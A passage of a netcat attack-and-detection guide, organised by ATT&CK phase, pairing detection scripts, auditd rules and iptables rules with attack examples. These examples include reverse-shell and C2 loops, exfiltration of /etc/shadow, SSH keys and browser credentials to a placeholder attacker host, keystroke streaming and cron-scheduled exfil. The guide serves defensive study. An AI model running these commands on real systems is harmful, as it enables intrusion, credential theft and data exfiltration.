ps aux | awk '$11 ~ /^\[.*\]$/ {print}' | grep -v "^\[k"

# Deleted executables
echo -e "\n=== Deleted Executables with Network ==="
for pid in $(ls /proc | grep -E "^[0-9]+$"); do
    if ls -la /proc/$pid/exe 2>/dev/null | grep -q deleted; then
        if ls -la /proc/$pid/fd 2>/dev/null | grep -q socket; then
            echo "PID $pid: $(ls -la /proc/$pid/exe 2>/dev/null)"
        fi
    fi
done

# Encrypted connections on unusual ports
echo -e "\n=== Encrypted Non-Standard Ports ==="
for conn in $(ss -tnp | grep ESTAB | grep -vE ":(443|993|995|636) " | awk '{print $5}'); do
    ip=$(echo $conn | cut -d: -f1)
    port=$(echo $conn | cut -d: -f2)
    echo | timeout 2 openssl s_client -connect $ip:$port 2>/dev/null | grep -q "CONNECTED" && echo "SSL on $ip:$port"
done 2>/dev/null

# Bash /dev/tcp usage
echo -e "\n=== Bash Network Connections ==="
lsof -c bash 2>/dev/null | grep -E "IPv4|IPv6"

echo -e "\n=== Detection Complete ==="
```
{% endcode %}

***

## Phase 8: Credential Access Detection

### Attack Techniques

#### Credential Harvesting Relay

```bash
# Capture credentials sent over network
# Attacker listens for credentials
nc -lvp 80 | tee captured_creds.txt

# Phishing/redirect to capture credentials
# Inject into victim traffic/application

# Relay captured authentication
nc -lvp 445 > smb_auth.pcap
```

#### Keylogger Relay

```bash
# Stream keystrokes to attacker
# Victim (with keylogger installed)
script -q /dev/null | nc <attacker> 4444

# Or with custom keylogger
cat /dev/input/event0 | nc <attacker> 4444

# Attacker captures
nc -lvp 4444 > keystrokes.log
```

#### Password File Exfiltration

{% code overflow="wrap" %}
```bash
# Exfil /etc/shadow (if readable)
cat /etc/shadow | nc <attacker> 4444

# Exfil credential files
cat ~/.ssh/id_rsa | nc <attacker> 4444
cat /etc/passwd | nc <attacker> 4444

# Browser credentials
find ~/.mozilla ~/.config/google-chrome -name "*.sqlite" -exec cat {} \; | nc <attacker> 4444
```
{% endcode %}

#### Memory Credential Dumping

```bash
# Dump process memory for credentials
gcore -o dump $(pgrep -f "sshd")
cat dump.* | nc <attacker> 4444

# /proc memory dump
cat /proc/$(pgrep sshd)/maps | nc <attacker> 4444

# SSH agent socket hijack
SSH_AUTH_SOCK=/tmp/ssh-xxx/agent.xxx ssh-add -l
```

### Detection Strategies

```bash
# Sensitive file reads
echo "=== Sensitive File Access ==="
ausearch -f /etc/shadow -f /etc/passwd -ts recent 2>/dev/null
lsof /etc/shadow /etc/passwd 2>/dev/null

# SSH key access
echo -e "\n=== SSH Key Access ==="
ausearch -f id_rsa -f id_ecdsa -f id_ed25519 -ts recent 2>/dev/null
find /home -name "id_rsa" -exec lsof {} \; 2>/dev/null

# Memory access patterns
echo -e "\n=== Suspicious Memory Access ==="
ps aux | grep -E "gcore|gdb|mem|dump" | grep -v grep

# Input device access
echo -e "\n=== Input Device Access ==="
lsof /dev/input/* 2>/dev/null
fuser /dev/input/* 2>/dev/null

# Network exfil of credentials
echo -e "\n=== Credential Exfil Patterns ==="
ss -tnp | grep -E "nc|netcat" | head -10
```

***

## Phase 9: Discovery Detection

### Attack Techniques

#### Network Discovery

```bash
# Network enumeration via netcat
for i in $(seq 1 254); do
    nc -znvw1 192.168.1.$i 22 2>&1 | grep -E "open|succeeded" &
done
wait

# Service discovery on target
for port in 21 22 23 25 80 110 139 143 443 445 3306 3389; do
    nc -znvw1 <target> $port 2>&1 | grep -E "open|succeeded"
done

# Banner-based service identification
for port in $(seq 1 1024); do
    echo "" | nc -vnw2 <target> $port 2>&1 | head -2
done

# ARP-like discovery using UDP
for i in $(seq 1 254); do
    nc -u -znvw1 192.168.1.$i 161 2>&1 &
done
wait
```

#### Internal Reconnaissance

```bash
# Discover internal services
nc -zvn 127.0.0.1 1-65535 2>&1 | grep -v "refused"

# Check for internal proxies
nc -zvn 127.0.0.1 3128 8080 8888 2>&1

# Database discovery
nc -zvn <target> 3306 5432 1521 1433 27017 2>&1

# Find listening services
ss -tunapl | nc <attacker> 4444  # Exfil network info
```

### Detection Strategies

{% code overflow="wrap" %}
```bash
# High rate of connection attempts
echo "=== Internal Scanning Detection ==="
ss -s
conntrack -C 2>/dev/null

# Failed connections from single source
echo -e "\n=== Connection Failures ==="
dmesg | grep -i "connection\|refused" | tail -20

# Netcat scanning processes
echo -e "\n=== Active Netcat Scans ==="
ps aux | grep -E "nc.*-z|nc.*seq" | grep -v grep

# Rapid port enumeration
echo -e "\n=== Port Scan Indicators ==="
grep -E "DPT=" /var/log/kern.log 2>/dev/null | awk -F'DPT=' '{print $2}' | awk '{print $1}' | sort | uniq -c | sort -rn | head -20
```
{% endcode %}

***

## Phase 10: Lateral Movement Detection

### Attack Techniques

#### Pivoting Through Compromised Hosts

```bash
# Simple relay/pivot
# On pivot host (compromised)
nc -lvp 8888 | nc <internal_target> 22
# Bidirectional pipe
nc -lvp 8888 <> /tmp/pipe | nc <internal_target> 22 <> /tmp/pipe

# Named pipe pivot
mkfifo /tmp/pipe
nc -lvp 8888 < /tmp/pipe | nc <internal_target> 22 > /tmp/pipe

# Attacker connects
nc <pivot_host> 8888
```

#### Port Forwarding

```bash
# Socat port forward
socat TCP-LISTEN:8888,fork TCP:<internal_target>:22

# Ncat port forward (broker mode)
ncat -l 8888 --sh-exec "ncat <internal_target> 22"

# Multiple hop pivoting
# Pivot 1 → Pivot 2 → Target
# On Pivot 1:
nc -lvp 8888 | nc <pivot2> 8888
# On Pivot 2:
nc -lvp 8888 | nc <target> 22
```

#### SOCKS Proxy Creation

```bash
# Using ncat as SOCKS proxy
ncat -l --proxy-type socks5 1080

# Combine with SSH
ssh -D 1080 user@pivot_host
# Then use netcat through proxy
nc -X 5 -x 127.0.0.1:1080 <target> 22
```

#### File Transfer Laterally

```bash
# Transfer tools to internal host
# On internal target
nc -lvp 8888 > mimikatz.exe

# On pivot
nc <internal_target> 8888 < mimikatz.exe

# Or from attacker through pivot
nc <pivot> 8888 < tools.tar.gz
# Pivot relays to internal
nc -lvp 8888 | nc <internal_target> 8888
```

### Detection Strategies

{% code overflow="wrap" %}
```bash
# Relay patterns (nc piped to nc)
echo "=== Relay Process Detection ==="
ps aux | grep -E "nc.*\|.*nc|netcat.*\|.*netcat" 
pstree -p | grep "nc.*nc\|netcat.*netcat"

# Named pipes for relaying
echo -e "\n=== Named Pipes (Pivot Indicators) ==="
find /tmp /var/tmp /dev/shm -type p -ls 2>/dev/null

# Socat relays
echo -e "\n=== Socat Relay Processes ==="
ps aux | grep -E "[s]ocat.*fork|[s]ocat.*LISTEN"

# Unusual internal connections
echo -e "\n=== Internal Network Connections ==="
ss -tunapl | grep -E "10\.|192\.168\.|172\.(1[6-9]|2[0-9]|3[01])\." | grep -v "127.0.0.1"

# Process with multiple network connections
echo -e "\n=== Multi-Connection Processes ==="
lsof -i 2>/dev/null | awk '{print $1, $2}' | sort | uniq -c | sort -rn | awk '$1 > 2 {print}'

# Ncat SOCKS proxy
echo -e "\n=== SOCKS Proxy Processes ==="
ps aux | grep -E "[n]cat.*proxy|[n]cat.*socks"
ss -tunapl | grep ":1080\|:9050"
```
{% endcode %}

#### Detection Script

```bash
#!/bin/bash
# Lateral Movement Detection Script

echo "=== Lateral Movement Detection ==="
echo "Timestamp: $(date)"
echo ""

# Pivot/relay processes
echo "=== Relay Processes ==="
ps aux | grep -E "nc|netcat|ncat|socat" | grep -v grep | while read line; do
    pid=$(echo "$line" | awk '{print $2}')
    fd_count=$(ls /proc/$pid/fd 2>/dev/null | wc -l)
    socket_count=$(ls -la /proc/$pid/fd 2>/dev/null | grep -c socket)
    if [ $socket_count -gt 1 ]; then
        echo "PID $pid has $socket_count sockets (possible relay):"
        echo "$line"
    fi
done

# Internal connections from netcat
echo -e "\n=== Netcat Internal Connections ==="
for pid in $(pgrep -x "nc\|netcat\|ncat"); do
    echo "PID $pid connections:"
    lsof -p $pid -i 2>/dev/null | grep -E "10\.|192\.168\.|172\."
done

# Named pipes
echo -e "\n=== Named Pipes (Relay Indicators) ==="
find /tmp /var/tmp /dev/shm /home -type p -ls 2>/dev/null

# Socat with fork (relay)
echo -e "\n=== Socat Relay Detection ==="
ps aux | grep -E "[s]ocat" | grep -E "fork|LISTEN"

# Chain of network processes
echo -e "\n=== Process Chains ==="
pstree -p 2>/dev/null | grep -E "nc|netcat|ncat|socat" | head -10

echo -e "\n=== Detection Complete ==="
```

***

## Phase 11: Collection Detection

### Attack Techniques

#### Data Staging

```bash
# Stage files for exfiltration
find /home -name "*.doc*" -exec cp {} /tmp/staging/ \;
tar czf /tmp/data.tar.gz /tmp/staging/
nc <attacker> 4444 < /tmp/data.tar.gz

# Real-time file streaming
tar czf - /home/user/Documents | nc <attacker> 4444

# Recursive directory collection
find /etc -type f -name "*.conf" | xargs tar czf - | nc <attacker> 4444
```

#### Clipboard Capture

```bash
# Monitor clipboard and send
while true; do
    xclip -selection clipboard -o 2>/dev/null | nc <attacker> 4444
    sleep 5
done

# Stream clipboard
xclip -selection clipboard -o | nc <attacker> 4444
```

#### Screen Capture

```bash
# Screenshot and exfil
import -window root /tmp/screen.png
nc <attacker> 4444 < /tmp/screen.png

# Continuous capture
while true; do
    import -window root - | nc <attacker> 4444
    sleep 30
done
```

#### Archive Creation

```bash
# Create and exfil archives
zip -r /tmp/data.zip /home/*/Documents /home/*/.ssh
nc <attacker> 4444 < /tmp/data.zip

# Encrypted archive
zip -P password /tmp/data.zip /sensitive/files
nc <attacker> 4444 < /tmp/data.zip
```

### Detection Strategies

```bash
# Large file operations
echo "=== Large File Operations ==="
find /tmp /var/tmp -size +10M -mtime -1 -ls 2>/dev/null

# Archive creation
echo -e "\n=== Recent Archives ==="
find / -type f \( -name "*.tar*" -o -name "*.zip" -o -name "*.rar" \) -mtime -1 2>/dev/null

# Staging directories
echo -e "\n=== Suspicious Staging ==="
find /tmp /var/tmp /dev/shm -type d -mtime -1 -ls 2>/dev/null

# High-volume file reads
echo -e "\n=== Bulk File Access ==="
ausearch -m OPEN -ts recent 2>/dev/null | grep -E "\.doc|\.pdf|\.xls|\.conf" | head -20

# Archive tools with network
echo -e "\n=== Archive + Network ==="
ps aux | grep -E "tar|zip|gzip|bzip2" | grep -v grep
lsof -c tar -c zip -c gzip 2>/dev/null | grep -E "IPv4|IPv6"
```

***

## Phase 12: Command & Control Detection

### Attack Techniques

#### Basic C2 Channel

```bash
# Attacker: C2 server
while true; do
    nc -lvp 4444
done

# Victim: Beacon with command output
while true; do
    sleep 60
    hostname; id; uptime | nc <attacker> 4444
done

# Bidirectional C2
# Attacker
nc -lvnp 4444

# Victim
while true; do
    nc <attacker> 4444 -e /bin/bash
    sleep 300  # Reconnect every 5 minutes
done
```

#### Resilient C2

```bash
# Multiple fallback addresses
while true; do
    nc <primary_c2> 4444 -e /bin/bash || \
    nc <secondary_c2> 4444 -e /bin/bash || \
    nc <tertiary_c2> 4444 -e /bin/bash
    sleep 60
done

# Domain fronting simulation
nc <cdn_ip> 443 -e /bin/bash
# With host header manipulation
```

#### Encrypted C2

```bash
# Ncat SSL C2
# Attacker
ncat --ssl -lvp 443

# Victim
while true; do
    ncat --ssl <attacker> 443 -e /bin/bash
    sleep 300
done

# Socat encrypted C2
socat OPENSSL:<attacker>:443,verify=0 EXEC:/bin/bash,pty,stderr
```

#### Covert Channels

```bash
# DNS-based (simulated with nc)
# Encode commands in DNS queries
# Send via nc to DNS port
echo "command_base64" | nc -u <dns_server> 53

# ICMP tunnel simulation
# Requires custom tool, but data exfil pattern similar

# HTTP-based C2
while true; do
    cmd=$(curl -s http://<c2>/cmd)
    $cmd | curl -s -X POST http://<c2>/output -d @-
    sleep 60
done
```

### Detection Strategies

#### Beaconing Detection

{% code overflow="wrap" %}
```bash
# Regular interval connections
echo "=== Beaconing Pattern Detection ==="
# Analyze connection timestamps
tcpdump -i any -c 1000 'tcp and port 4444' 2>/dev/null | awk '{print $1}' | cut -d. -f1 | uniq -c

# Long-lived connections
echo -e "\n=== Long-Lived Connections ==="
ss -tnp | grep ESTAB | while read line; do
    local_port=$(echo "$line" | awk '{print $4}' | cut -d: -f2)
    # Check connection duration via /proc
done

# Periodic process execution
echo -e "\n=== Periodic Network Processes ==="
ps aux | grep -E "[n]c|[n]etcat|[n]cat" | awk '{print $9, $10, $11}'
```
{% endcode %}

#### C2 Traffic Analysis

{% code overflow="wrap" %}
```bash
# Connections to unusual destinations
echo "=== Unusual Destinations ==="
ss -tnp | grep ESTAB | awk '{print $5}' | cut -d: -f1 | sort -u | while read ip; do
    whois $ip 2>/dev/null | grep -iE "country|orgname" | head -2
done

# Non-standard port usage
echo -e "\n=== Non-Standard Ports ==="
ss -tnp | grep -vE ":(22|80|443|25|53|993|995|3306) " | grep ESTAB

# SSL on unusual ports
echo -e "\n=== Encrypted Non-Standard ==="
ss -tnp | grep ESTAB | grep -vE ":443 " | while read line; do
    ip_port=$(echo "$line" | awk '{print $5}')
    timeout 2 openssl s_client -connect $ip_port 2>/dev/null | grep -q CONNECTED && echo "SSL: $ip_port"
done
```
{% endcode %}

#### Detection Script

{% code overflow="wrap" %}
```bash
#!/bin/bash
# C2 Detection Script

echo "=== Command & Control Detection ==="
echo "Timestamp: $(date)"
echo ""

# Persistent netcat listeners
echo "=== Persistent Listeners ==="
ss -tunapl | grep LISTEN | grep -E "nc|netcat|ncat"

# Outbound connections from shell processes
echo -e "\n=== Shell Outbound Connections ==="
lsof -i 2>/dev/null | grep -E "bash|sh|nc|netcat" | grep -v "127.0.0.1"

# Reconnecting patterns
echo -e "\n=== Reconnecting Processes ==="
ps aux | grep -E "while.*nc|while.*netcat|sleep.*nc" | grep -v grep

# Encrypted channels
echo -e "\n=== Encrypted Netcat ==="
ps aux | grep -E "ncat.*ssl|socat.*OPENSSL" | grep -v grep

# Connection to known bad ports
echo -e "\n=== Suspicious Port Connections ==="
ss -tnp | grep ESTAB | grep -E ":(4444|5555|6666|1234|31337|8888|9999)"

# DNS anomalies (high query rate)
echo -e "\n=== DNS Query Anomalies ==="
ss -unp | grep ":53" | awk '{print $5}' | sort | uniq -c | sort -rn | head -5

# Process with multiple reconnects
echo -e "\n=== Process Network History ==="
ausearch -c nc -c netcat -c ncat -ts recent 2>/dev/null | grep -E "connect|socket" | tail -20

echo -e "\n=== Detection Complete ==="
```
{% endcode %}

***

## Phase 13: Exfiltration Detection

### Attack Techniques

#### Direct File Exfiltration

```bash
# Single file
nc <attacker> 4444 < /etc/passwd
cat /etc/shadow | nc <attacker> 4444

# Multiple files
tar czf - /path/to/files | nc <attacker> 4444

# Attacker receives
nc -lvp 4444 > exfil.tar.gz

# Large file with progress
pv /path/to/large/file | nc <attacker> 4444
```

#### Compressed Exfiltration

```bash
# Gzip compression
gzip -c sensitive.db | nc <attacker> 4444

# XZ compression (better ratio)
xz -c sensitive.db | nc <attacker> 4444

# Encrypted exfiltration
gpg -c -o - sensitive.db | nc <attacker> 4444
openssl enc -aes-256-cbc -pass pass:secret -in file -out - | nc <attacker> 4444
```

#### Chunked Exfiltration

```bash
# Split into chunks
split -b 1M large_file.zip chunk_
for chunk in chunk_*; do
    nc <attacker> 4444 < $chunk
    sleep 30  # Avoid detection
done

# Attacker reassembles
for i in $(seq 1 100); do
    nc -lvp 4444 >> reassembled.zip
done
```

#### Scheduled Exfiltration

```bash
# Cron-based exfil
echo "0 * * * * cat /var/log/auth.log | nc <attacker> 4444" | crontab -

# Sleep-based
while true; do
    find /home -name "*.pdf" -newer /tmp/marker -exec cat {} \; | nc <attacker> 4444
    touch /tmp/marker
    sleep 3600
done
```

#### Covert Channel Exfiltration

```bash
# DNS exfil simulation
# Encode data in DNS queries
data=$(cat secret.txt | base64 | tr '+/' '-_')
echo "$data.exfil.attacker.com" | nc -u <dns> 53

# ICMP exfil (requires root)
# Encode in ping payload

# Steganography + exfil
steghide embed -cf image.jpg -ef secret.txt
nc <attacker> 4444 < image.jpg
```

### Detection Strategies

#### Network Monitoring

```bash
# Large outbound transfers
echo "=== Large Outbound Transfers ==="
iftop -i eth0 -t -s 10 2>/dev/null | grep "=>" | sort -k3 -rn | head -10

# Netcat outbound connections
echo -e "\n=== Netcat Outbound ==="
ss -tnp | grep -E "nc|netcat|ncat" | grep -v LISTEN

# Unusual outbound ports
echo -e "\n=== Unusual Outbound Ports ==="
ss -tnp | grep -vE ":(22|80|443|25|53) " | grep ESTAB

# Connection duration (long exfil)
echo -e "\n=== Long Connections ==="
ss -tnp | grep ESTAB | head -20
```

#### File Access Monitoring

```bash
# Sensitive file reads
echo "=== Sensitive File Access ==="
ausearch -f /etc/shadow -f /etc/passwd -ts recent 2>/dev/null
lsof /etc/shadow /etc/passwd 2>/dev/null

# Large file reads
echo -e "\n=== Large File Reads ==="
lsof -s 2>/dev/null | awk '$7 > 10000000 {print}'

# Archive creation
echo -e "\n=== Archive Activity ==="
ps aux | grep -E "tar|zip|gzip|xz|gpg" | grep -v grep
ausearch -c tar -c zip -c gzip -ts recent 2>/dev/null | tail -10
```

#### Detection Script

{% code overflow="wrap" %}
```bash
#!/bin/bash
# Exfiltration Detection Script

echo "=== Data Exfiltration Detection ==="
echo "Timestamp: $(date)"
echo ""

# Netcat outbound
echo "=== Netcat Outbound Connections ==="
ss -tnp 2>/dev/null | grep -E "nc|netcat|ncat" | grep -v LISTEN

# Large outbound
echo -e "\n=== Large Data Transfers ==="
cat /proc/net/dev | awk 'NR>2 {print $1, $10}' | sort -k2 -rn

# File access to sensitive areas
echo -e "\n=== Recent Sensitive File Access ==="
find /etc /home -name "*.conf" -o -name "*.pem" -o -name "id_rsa" -exec ls -la {} \; 2>/dev/null | head -20

# Compression activity
echo -e "\n=== Compression Processes ==="
ps aux | grep -E "[t]ar|[z]ip|[g]zip|[x]z|[g]pg|[o]penssl" 

# Chunks in temp
echo -e "\n=== Chunked Files (Split) ==="
find /tmp /var/tmp -name "chunk*" -o -name "split*" -o -name "part*" 2>/dev/null

# DNS exfil indicators
echo -e "\n=== DNS Query Volume ==="
tcpdump -i any -c 100 port 53 2>/dev/null | wc -l

# Scheduled exfil
echo -e "\n=== Scheduled Exfil Tasks ==="
crontab -l 2>/dev/null | grep -E "nc|netcat|curl|wget"
grep -rE "nc|netcat" /etc/cron* /var/spool/cron 2>/dev/null

echo -e "\n=== Detection Complete ==="
```
{% endcode %}

***

## Additional Attack Types

### Port Knocking with Netcat

```bash
# Port knock sequence
for port in 1234 5678 9012; do
    nc -zw1 <target> $port
done
nc <target> 22  # Now accessible

# Detection
iptables -A INPUT -p tcp --dport 1234 -j LOG --log-prefix "KNOCK1: "
```

### Man-in-the-Middle with Netcat

```bash
# Simple MITM relay
mkfifo /tmp/pipe
nc -lvp 8080 < /tmp/pipe | tee /tmp/capture.log | nc <real_server> 80 > /tmp/pipe

# Detection
# Monitor for duplicate connections, relay processes
ps aux | grep -E "nc.*\|.*nc|tee.*nc"
```

### UDP Attacks

```bash
# UDP shell
nc -u -lvp 4444 -e /bin/bash

# UDP exfil (evades some firewalls)
cat data | nc -u <attacker> 53

# Detection
ss -unp | grep -E "nc|netcat"
```

***

## Comprehensive Detection Script

{% code overflow="wrap" %}
```bash
#!/bin/bash
# Comprehensive Netcat Weaponization Detection

LOG_FILE="/var/log/netcat_detection.log"

echo "========================================" | tee -a $LOG_FILE
echo "Netcat Weaponization Detection Report" | tee -a $LOG_FILE
echo "Timestamp: $(date)" | tee -a $LOG_FILE
echo "Host: $(hostname)" | tee -a $LOG_FILE
echo "========================================" | tee -a $LOG_FILE

# 1. Process Detection
echo -e "\n[1] PROCESS DETECTION" | tee -a $LOG_FILE
echo "------------------------" | tee -a $LOG_FILE

echo -e "\n[1.1] Active Netcat Processes:" | tee -a $LOG_FILE
ps aux | grep -E "[n]c |[n]etcat|[n]cat|[s]ocat" | tee -a $LOG_FILE

echo -e "\n[1.2] Netcat with Execute Flags:" | tee -a $LOG_FILE
ps aux | grep -E "nc.*-e|nc.*-c|ncat.*-e" | grep -v grep | tee -a $LOG_FILE

echo -e "\n[1.3] Process Trees:" | tee -a $LOG_FILE
pstree -p 2>/dev/null | grep -E "nc|netcat|ncat|socat" | tee -a $LOG_FILE

# 2. Network Detection
echo -e "\n[2] NETWORK DETECTION" | tee -a $LOG_FILE
echo "------------------------" | tee -a $LOG_FILE

echo -e "\n[2.1] Listening Services:" | tee -a $LOG_FILE
ss -tunapl | grep LISTEN | grep -E "nc|netcat|ncat|socat" | tee -a $LOG_FILE

echo -e "\n[2.2] Established Connections:" | tee -a $LOG_FILE
ss -tunapl | grep ESTAB | grep -E "nc|netcat|ncat|socat" | tee -a $LOG_FILE

echo -e "\n[2.3] Shell Port Connections (4444, 5555, etc.):" | tee -a $LOG_FILE
ss -tunapl | grep -E ":(4444|5555|6666|1234|9999|1337|8888)" | tee -a $LOG_FILE

echo -e "\n[2.4] Shells with Network Connections:" | tee -a $LOG_FILE
lsof -i 2>/dev/null | grep -E "bash|sh|dash|zsh" | grep -v sshd | tee -a $LOG_FILE

# 3. File System Detection
echo -e "\n[3] FILE SYSTEM DETECTION" | tee -a $LOG_FILE
echo "------------------------" | tee -a $LOG_FILE

echo -e "\n[3.1] Named Pipes (FIFO):" | tee -a $LOG_FILE
find /tmp /var/tmp /dev/shm -type p -ls 2>/dev/null | tee -a $LOG_FILE

echo -e "\n[3.2] Suspicious Executables in Temp:" | tee -a $LOG_FILE
find /tmp /var/tmp /dev/shm -type f -executable -ls 2>/dev/null | tee -a $LOG_FILE

echo -e "\n[3.3] Netcat Copies in Unusual Locations:" | tee -a $LOG_FILE
find /tmp /var/tmp /dev/shm /home -name "*nc*" -type f -executable 2>/dev/null | tee -a $LOG_FILE

echo -e "\n[3.4] Deleted Executables with Network:" | tee -a $LOG_FILE
ls -la /proc/*/exe 2>/dev/null | grep deleted | tee -a $LOG_FILE

# 4. Persistence Detection
echo -e "\n[4] PERSISTENCE DETECTION" | tee -a $LOG_FILE
echo "------------------------" | tee -a $LOG_FILE

echo -e "\n[4.1] Cron Jobs with Netcat:" | tee -a $LOG_FILE
grep -rE "(nc |netcat|ncat|mkfifo|/dev/tcp)" /etc/cron* /var/spool/cron 2>/dev/null | tee -a $LOG_FILE

echo -e "\n[4.2] Systemd Services with Netcat:" | tee -a $LOG_FILE
grep -rE "(nc |netcat|ncat)" /etc/systemd/system/*.service 2>/dev/null | tee -a $LOG_FILE

echo -e "\n[4.3] Profile Files with Netcat:" | tee -a $LOG_FILE
grep -rE "(nc |netcat|ncat|/dev/tcp)" /etc/profile* /etc/bash* /home/*/.bashrc /home/*/.profile 2>/dev/null | tee -a $LOG_FILE

echo -e "\n[4.4] SSH RC Files:" | tee -a $LOG_FILE
find /home /root -name "rc" -path "*/.ssh/*" -exec cat {} \; 2>/dev/null | tee -a $LOG_FILE

# 5. Defense Evasion Detection
echo -e "\n[5] DEFENSE EVASION DETECTION" | tee -a $LOG_FILE
echo "------------------------" | tee -a $LOG_FILE

echo -e "\n[5.1] Suspicious Process Names:" | tee -a $LOG_FILE
ps aux | awk '$11 ~ /^\[.*\]$/ || $11 ~ /^\./' | grep -v "^\[k" | tee -a $LOG_FILE

echo -e "\n[5.2] Encrypted Netcat Sessions:" | tee -a $LOG_FILE
ps aux | grep -E "ncat.*ssl|socat.*OPENSSL" | grep -v grep | tee -a $LOG_FILE

echo -e "\n[5.3] Bash Network Connections:" | tee -a $LOG_FILE
lsof -c bash 2>/dev/null | grep -E "IPv4|IPv6" | tee -a $LOG_FILE

# 6. Audit Log Analysis
echo -e "\n[6] AUDIT LOG ANALYSIS" | tee -a $LOG_FILE
echo "------------------------" | tee -a $LOG_FILE

echo -e "\n[6.1] Recent Netcat Executions:" | tee -a $LOG_FILE
ausearch -c nc -c netcat -c ncat -ts recent 2>/dev/null | tail -30 | tee -a $LOG_FILE

# 7. Summary
echo -e "\n[7] SUMMARY" | tee -a $LOG_FILE
echo "------------------------" | tee -a $LOG_FILE
echo "Active nc/netcat/ncat processes: $(ps aux | grep -E '[n]c |[n]etcat|[n]cat' | wc -l)" | tee -a $LOG_FILE
echo "Suspicious listeners: $(ss -tunapl | grep LISTEN | grep -E 'nc|netcat|ncat' | wc -l)" | tee -a $LOG_FILE
echo "Named pipes in temp: $(find /tmp /var/tmp /dev/shm -type p 2>/dev/null | wc -l)" | tee -a $LOG_FILE
echo "Shell port connections: $(ss -tunapl | grep -E ':(4444|5555|6666|1234)' | wc -l)" | tee -a $LOG_FILE

echo -e "\n========================================" | tee -a $LOG_FILE
echo "Detection Complete" | tee -a $LOG_FILE
echo "Log saved to: $LOG_FILE" | tee -a $LOG_FILE
```
{% endcode %}

***

## Quick Reference Card

### Common Attack Patterns

| Attack        | Command                                                      | Detection                    |
| ------------- | ------------------------------------------------------------ | ---------------------------- |
| Bind Shell    | `nc -lvp 4444 -e /bin/bash`                                  | Listen on unusual ports      |
| Reverse Shell | `nc <attacker> 4444 -e /bin/bash`                            | Outbound to unusual ports    |
| FIFO Shell    | `mkfifo /tmp/f; cat /tmp/f\|/bin/bash\|nc <ip> 4444 >/tmp/f` | Named pipes in /tmp          |
| Port Scan     | `nc -zv <target> 1-1024`                                     | Rapid connection attempts    |
| Banner Grab   | `nc -v <target> 80`                                          | Service enumeration patterns |
| File Exfil    | `cat file \| nc <attacker> 4444`                             | Large outbound transfers     |
| Relay/Pivot   | `nc -lvp 8888 \| nc <target> 22`                             | Multi-socket processes       |
| C2 Beacon     | `while true; do nc <c2> 4444 -e /bin/bash; sleep 300; done`  | Periodic connections         |

### Detection Commands

| Task               | Command                                      |
| ------------------ | -------------------------------------------- |
| Find nc processes  | `ps aux \| grep -E '[n]c\|[n]etcat\|[n]cat'` |
| Find listeners     | `ss -tunapl \| grep LISTEN`                  |
| Find named pipes   | `find /tmp -type p`                          |
| Shell network conn | `lsof -i \| grep bash`                       |
| Audit nc execution | `ausearch -c nc`                             |
| Process tree       | `pstree -p \| grep nc`                       |
| Deleted binaries   | `ls -la /proc/*/exe \| grep deleted`         |

### Defensive Rules

```bash
# Auditd
auditctl -w /usr/bin/nc -p x -k netcat
auditctl -w /usr/bin/ncat -p x -k netcat
auditctl -a always,exit -S mknodat -k fifo

# iptables
iptables -A OUTPUT -p tcp --dport 4444 -j DROP
iptables -A INPUT -p tcp --dport 4444 -j DROP

# Restrict execution
chmod 700 /usr/bin/nc
chattr +i /usr/bin/nc  # Immutable
```

### Log Locations

| Log                        | Content              |
| -------------------------- | -------------------- |
| `/var/log/auth.log`        | Authentication, sudo |
| `/var/log/syslog`          | System events        |
| `/var/log/audit/audit.log` | Auditd events        |
| `/var/log/kern.log`        | Firewall, kernel     |
| `journalctl`               | Systemd logs         |

***

### MITRE ATT\&CK Mapping

| Tactic               | Technique               | Netcat Usage            |
| -------------------- | ----------------------- | ----------------------- |
| Reconnaissance       | T1046 Network Scanning  | `nc -zv` port scanning  |
| Initial Access       | T1059 Command Execution | Reverse/bind shells     |
| Execution            | T1059.004 Unix Shell    | `-e /bin/bash`          |
| Persistence          | T1053 Scheduled Task    | Cron + nc reverse shell |
| Privilege Escalation | T1548 SUID Abuse        | SUID nc binary          |
| Defense Evasion      | T1027 Obfuscation       | Renamed binaries, SSL   |
| Credential Access    | T1003 Credential Dump   | Exfil /etc/shadow       |
| Discovery            | T1018 Remote Discovery  | Banner grabbing         |
| Lateral Movement     | T1090 Proxy             | Relay/pivot chains      |
| Collection           | T1560 Archive           | tar + nc exfil          |
| Command & Control    | T1571 Non-Standard Port | C2 on 4444, etc.        |
| Exfiltration         | T1048 Exfil Over C2     | Direct file transfer    |
